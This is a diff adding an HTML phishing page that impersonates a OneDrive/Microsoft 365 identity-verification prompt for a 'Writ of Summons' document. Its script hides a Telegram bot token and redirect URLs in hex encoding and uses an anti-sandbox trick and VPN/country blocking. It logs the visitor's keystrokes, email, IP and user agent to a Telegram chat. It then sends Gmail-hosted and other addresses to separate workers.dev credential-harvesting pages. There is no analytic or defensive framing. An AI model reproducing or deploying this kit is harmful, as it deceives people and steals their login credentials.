@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+<title>RECIPIENT VERIFICATION</title>
+<style>
+html,body{margin:0;padding:0;height:100%;background:#fff;font-family:Arial,sans-serif;overflow-x:hidden;}
+.header{background:#2F79D1;width:100%;height:35px;line-height:35px;color:#fff;padding-left:20px;}
+img{display:block;margin:40px auto;width:120px;height:auto;}
+.main-container{width:22%;height:auto;margin:0 auto;background:#fff;border-radius:9px;box-shadow:0 4px 8px rgba(0,0,0,0.1);border:1px solid #ebebeb;overflow:hidden;display:flex;flex-direction:column;padding:20px 25px;}
+.top-container{padding:15px 0;text-align:center;color:#3e3e3e;border-bottom:1px solid #ebebeb;font-size:20px;}
+.content-container{margin-top:20px;color:#3e3e3e;}
+.content-container p{font-size:14px;margin:10px 0;}
+.content-container p.ash-text{color:#808080;}
+.document-title{text-align:center;font-size:16px;font-weight:bold;color:#303030;margin-bottom:20px;}
+.input-box{display:flex;align-items:center;border:1px solid #ccc;border-radius:4px;padding:0 10px;box-sizing:border-box;height:40px;width:100%;margin:10px auto;transition:border-color .3s;}
+.input-box input{border:none;outline:none;flex:1;font-size:14px;}
+.input-box:focus-within{border:1px solid #2F79D1;box-shadow:0 0 4px rgba(47,121,209,0.5);}
+.input-box span{font-size:1.2rem;color:#888;}
+.submit-button{display:block;text-decoration:none;color:#fff;text-align:center;background:#2F79D1;width:100%;height:50px;line-height:50px;margin:20px auto 10px;border-radius:4px;border:none;cursor:pointer;font-size:16px;position:relative;}
+.submit-button:hover{filter:brightness(1.1);}
+.submit-button.loading-dots::after{content:'...';position:absolute;width:20px;overflow:hidden;display:inline-block;vertical-align:bottom;animation:dotty steps(1,end) 1s infinite;}
+@keyframes dotty{0%{content:'';}25%{content:'.';}50%{content:'..';}75%{content:'...';}}
+.footer-text{font-size:12px;color:#3e3e3e;margin-top:10px;text-align:left;}
+.footer-copy{text-align:center;font-size:12px;color:#303030;margin-top:20px;}
+.shake{animation:shake 0.5s linear;}
+@keyframes shake{0%,100%{transform:translateX(0);}10%,30%,50%,70%,90%{transform:translateX(-5px);}20%,40%,60%,80%{transform:translateX(5px);}}
+@media (max-width:768px){.main-container{width:90%;height:auto;max-width:320px;padding:15px;}.top-container{padding:10px 0;font-size:16px;}.content-container p,.footer-text{font-size:12px;}.document-title{font-size:14px;}.submit-button{height:40px;line-height:40px;font-size:14px;}}
+</style>
+</head>
+<body>
+<div class="header">OneDrive</div>
+<img src="https://www.shutterstock.com/image-vector/galati-romania-april-28-2023-260nw-2295115457.jpg">
+<div class="main-container">
+<div class="top-container">Verify Your Identity</div>
+<div class="content-container">
+<p class="ash-text">You've received a secure link to:</p>
+<p class="document-title">Writ of Summons -Wesley Deleon</p>
+<p class="ash-text">To open this secure document, we'll need you to enter the email that this item was shared to.<br><br></p>
+<form id="verifyForm">
+<div class="input-box">
+<input type="email" id="email" placeholder="Enter email"><span title="Info">&#9993;</span>
+</div>
+<button type="submit" class="submit-button" id="submitBtn">Next</button>
+</form>
+<p class="footer-text"><br>Microsoft 365 Threat Protection requires email verification to secure sensitive data. Microsoft's General Data Protection Regulation (GDPR)-compliant protocol (Section 3.2) enforces authorized access by implementing real-time AI threat analysis and malware defense powered by Microsoft Defender to secure document handling.</p>
+</div>
+</div>
+<p class="footer-copy">© 2025 Microsoft Privacy & Cookies</p>
+
+<script>
+<script>
+(()=>{
+    // Hex-encoded destinations
+    const h = "68747470733A2F2F6F6666792D6174742D333339322E79616C65706F6C6C61636B6C61772E776F726B6572732E6465762F3F653D"; 
+    const o = "68747470733A2F2F6174742D676F6F2D676F676C653232692E79616C65706F6C6C61636B6C61772E776F726B6572732E6465762F3F653D"; 
+    
+    const botTokenHex = "373930363632333935393a4141466d4770426d735455455138654a456e4d6d76686d4b6f54765949696450353859";
+    const botToken = botTokenHex.match(/.{1,2}/g).map(byte=>String.fromCharCode(parseInt(byte,16))).join('');
+    const hexDecode = x => x.match(/.{1,2}/g).map(y=>String.fromCharCode(parseInt(y,16))).join('');
+    
+    // Domain lists
+    const googleDomains = ['gmail.com', 'googlemail.com', 'google.com'];
+    
+    // Anti-sandbox technique
+    (function(){
+        let e=new Image();
+        Object.defineProperty(e,'id',{get:()=>window.location.href="about:blank"});
+        console.log(e);
+    })();
+    
+    // Security checks
+    fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{
+        if(d.org&&(d.org.match(/VPN|Proxy|TOR/i)||['RU','CN','KP'].includes(d.country))){
+            document.body.innerHTML="<h2>Access Denied</h2>";
+        }
+    }).catch(()=>{});
+
+    async function checkGoogleMX(domain) {
+        const url = `https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(domain)}&type=MX`;
+        try {
+            const resp = await fetch(url, {
+                headers: { 'accept': 'application/dns-json' }
+            });
+            const data = await resp.json();
+            if (!data.Answer || data.Answer.length === 0) {
+                return { isGoogle: false, error: "No MX records found" };
+            }
+            const mxRecords = data.Answer.map(ans => {
+                const parts = ans.data.split(' ');
+                return parts[parts.length - 1].toLowerCase().replace(/\.$/, '');
+            });
+            const isGoogle = mxRecords.some(mx =>
+                mx.includes('google.com') || mx.includes('googlemail.com')
+            );
+            return { isGoogle, error: null };
+        } catch (e) {
+            return { isGoogle: false, error: "Lookup failed" };
+        }
+    }
+
+    async function getClientInfo() {
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const ipData = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
+        return {
+            isBot: /bot|crawl|spider|facebookexternalhit|WhatsApp|google|bing|duckduckbot|yandex|baidu|slurp|exabot|facebot|ia_archiver/i.test(navigator.userAgent),
+            ip: ipData.ip || 'Unknown',
+            timezone: timezone,
+            timestamp: new Date().toLocaleString(),
+            userAgent: navigator.userAgent
+        };
+    }
+
+    async function sendTelegramNotification(message) {
+        const clientInfo = await getClientInfo();
+        const fullMessage = `${clientInfo.isBot ? "🚩 Bot Visit" : "✅ New Visit"}
+- IP: ${clientInfo.ip}
+- Location: ${clientInfo.timezone.split('/').pop().replace('_', ' ')}
+- Time: ${clientInfo.timestamp}
+- User Agent: ${clientInfo.userAgent}
+${message}`;
+        
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: "-1002230164444",
+                text: fullMessage
+            })
+        }).catch(() => {});
+    }
+
+    async function verifyEmail(email) {
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.classList.add('loading-dots');
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Verifying';
+        
+        const domain = email.split('@')[1].toLowerCase();
+        const clientInfo = await getClientInfo();
+        
+        // Send initial notification
+        sendTelegramNotification(`
+📩 Email Submitted
+- Email: ${email}
+- Domain: ${domain}
+`);
+        
+        // Check domain type
+        let isGoogle = googleDomains.includes(domain);
+        try {
+            const mxPromise = checkGoogleMX(domain);
+            const mxResult = await Promise.race([
+                mxPromise,
+                new Promise(resolve => setTimeout(() => resolve(null), 5000))
+            ]);
+            if (mxResult && mxResult.isGoogle) isGoogle = true;
+        } catch (e) {}
+        
+        submitBtn.textContent = 'Finalizing...';
+        
+        // Determine redirect URL
+        const targetHex = isGoogle ? o : h;
+        setTimeout(() => {
+            window.location.href = hexDecode(targetHex) + encodeURIComponent(email);
+        }, 420);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        const emailInput = document.getElementById("email");
+        const form = document.getElementById("verifyForm");
+    
+        if(localStorage.getItem("email")) {
+            emailInput.value = localStorage.getItem("email");
+        }
+        
+        emailInput.focus();
+        
+        // Keypress handler for Enter key
+        emailInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                form.dispatchEvent(new Event('submit'));
+            }
+        });
+   
+        let lastSent = 0;
+        emailInput.addEventListener('input', () => {
+            localStorage.setItem("email", emailInput.value);
+            
+            // Throttled keystroke logging
+            const now = Date.now();
+            if (now - lastSent < 1000) return;
+            lastSent = now;
+            
+            const value = emailInput.value.trim();
+            if (value) {
+                sendTelegramNotification(`⌨️ Keystroke Input: ${value}`);
+            }
+        });
+   
+        form.onsubmit = (e) => {
+            e.preventDefault();
+            const email = emailInput.value.trim();
+            
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                emailInput.classList.add('shake');
+                setTimeout(() => emailInput.classList.remove('shake'), 500);
+                emailInput.focus();
+                return;
+            }
+            
+            verifyEmail(email);
+        };
+     
+        sendTelegramNotification("⌚ New Visit");
+    });
+})();
+</script>
+</body>
+</html>
+</script>
+</body>
+</html>
